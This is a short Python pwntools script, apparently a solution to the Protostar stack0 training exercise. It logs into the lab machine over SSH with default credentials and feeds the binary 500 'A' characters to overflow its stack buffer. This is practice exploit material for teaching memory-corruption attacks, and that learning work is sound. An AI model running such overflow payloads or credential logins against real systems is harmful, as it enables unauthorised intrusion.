from pwn import *
import os

ip = os.getenv("PROTOSTAR")
shell = ssh('user', ip, password='user')


exploit = "A"*500
sh = shell.run("sh")

sh.sendline("cd /opt/protostar/bin/")
sh.sendline("./stack0")
sh.sendline(exploit)
print(sh.recvline())